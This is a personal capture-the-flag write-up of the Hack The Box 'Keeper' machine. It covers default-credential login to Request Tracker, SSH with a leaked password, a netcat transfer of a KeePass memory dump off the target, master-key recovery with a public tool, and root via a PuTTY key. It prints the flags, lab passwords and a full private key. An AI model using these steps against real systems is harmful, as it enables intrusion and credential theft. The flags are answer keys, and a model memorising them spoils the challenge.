---
title: HTB 2 - Keeper
tag: htb
category: cyber
---

## Comments

This was an easy box and I didn't have to refer to any walkthrough to solve it. Being able to solve it completely on my own after struggling so much with the much harder Cozyhosting box was pretty fulfilling.


## Walkthrough

Target IP: 

    10.10.11.227

### Enumeration

First do an nmap scan which shows the following ports:

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    80/tcp open  http    nginx 1.18.0 (Ubuntu)
    |_http-favicon: Unknown favicon MD5: CF60F068F7A5343704B608CCE387F31F
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-server-header: nginx/1.18.0 (Ubuntu)
    |_http-title: Login
    |_http-trane-info: Problem with XML parsing of /evox/about
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Pretty default ports. Take note of the open `ssh` port which might be useful later on if we get ssh credentials.

Visit target IP on browser points to `tickets.keeper.htb/rt/`

Add `tickets.keeper.htb` to our `/etc/hosts` file

The website is using RequestTracker v4.4.4+dfsg-2ubuntu1 and is requesting for a login.

RequestTracker (RT) is a free software for tracking IT tickets.

Maybe we can try to find some common login credentials? 

Let's try the default login `root:password` provided by Google. It works!

### Foothold

Exploring the admin dashboard of the RT website, we can find interesting info under

    Admin > Tools > System Config

The database information might come in handy later. Let's keep it.

Another find is under `Users > Select` which shows the existing user accounts and additional info.

We are logged in as `root` which has SuperUser access. The other account `lnorgaard` somehow has its password stored in plaintext in the comments field.

Since `ssh` is open, let's try `ssh root@...` with the default password. Doesn't work, at least they changed it.

Now let's try `ssh lnorgaard@...` with `Welcome2023!`... looks like Lisa didn't change her default password. We get the user.txt = ef14585dce7035b1e1af3048d012c60b

### Privilege Escalation

Next, we check if `lnorgaard` has any sudo privileges.

    sudo -l
    > Sorry, user lnorgaard may not run sudo on keeper.

Looking around the user files, we can find some suspicious information:

    KeePassDumpFull.dmp  passcodes.kdbx  RT30000.zip  user.txt

`RT30000.zip` is just the compressed version of the first 2 files. The `.zip` is 80MB while the other files are 300MB. 

`.kdbx` stands for KeePassDatabaseExtension, which is a file-store database that holds encrypted KeePass passwords.

### Exploit

KeePass databases are meant to be opened with the KeePass program or with `kpcli` in the CLI. KeePass encrypts all the passwords stored inside it using a master key password. So we need a way to get this master key if we are to read the passwords.

Luckily, there seems to be a memory dump of the entire KeePass program either while it was running or setup (and crashed).

There is already an [exploit](https://github.com/vdohney/keepass-password-dumper) for KeePass memdumps.
According to the above PoC, there is a vulnerability in KeePass where the master key plaintext is exposed during the setup and can be extracted in the memdump. This tool extracts the master key from a memdump file.

Since the tool is built in .NET, we have to use a Windows machine to run it.

First, we'll download the `RT30000.zip` locally. I chose to use `netcat` to transfer the file over. 

    LOCAL

    nc -lvnp 1234 > RT30000.zip

    TARGET
    nc -p 1234 < RT30000.zip

Next, I am running a VM inside my Windows machine so I transfer `RT30000.zip` over via SCP by running `pscp` on Windows.

    pscp user@<VM_eth0_IP>:[VM_source_path] [Windows_dest_path]

Side note for this to work:
- VM network must be set up to use Bridged Adapter mode.
- You should use the IP address of the `eth0` adapter and not the `tun0` VPN IP
- Make sure OpenSSH is installed in the VM and `ufw` is allowing `ssh` (use `sudo ufw enable | ufw allow ssh`)

Remember to unzip the file after so you have `KeePassDumpFull.dmp` in the directory.

Run the .NET program on Windows:

    cd keepass-password-dumper
    dotnet run [PATH_TO_DUMP]

The master key is pretty clear, except for the first 2 characters (expected):

    __dgrød med fløde

We could brute force it but a Google search of `dgrød med fløde` returns `rødgrød med fløde` which is Danish red berry pudding. Makes sense since our user has a Scandinavian name. 

With this master key, we go back to our local machine and run `kpcli` on the `.kdbx` with the key. Note that `kpcli` needs to be installed first.

KeePass stores data in directory format. After some exploration, I found the entry for the RT server:

    Title: keeper.htb (Ticketing Server)
    Uname: root
    Pass: F4><3K0nd!
    URL: 
    Notes: PuTTY-User-Key-File-3: ssh-rsa
        Encryption: none
        Comment: rsa-key-20230519
        Public-Lines: 6
        AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
        8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
        EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
        Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
        FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
        LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
        Private-Lines: 14
        AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
        oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
        kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
        f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
        VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
        UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
        OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
        in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
        SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
        09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
        xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
        AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
        AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
        NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
        Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0

We have a plaintext password `F4><3K0nd!` for `root`. Note: Faxe Kondi is a Danish soft drink.

However, these credentials still don't allow us to `ssh` as `root`. Maybe the password was changed...

We have an easier way in. In the notes section, there is a plaintext Putty ssh key!

Since Putty is only for Windows, we have to convert the Putty key into an OpenSSH key which we can use directly in Linux.

To do this:
1. Copy over the entire text inside Notes
2. Save the text file as `.ppk`
3. Convert `.ppk` into `.pem`. Install `puttygen` first.

        puttygen root.ppk -O private-openssh -o root.pem

4. `ssh` with `.pem`

        ssh -i root.pem root@10.10.11.227

Once in root, the root.txt = 9178ec92153cd5bd22bb4ebf5425229c


*That's all for tonight, ciao.*


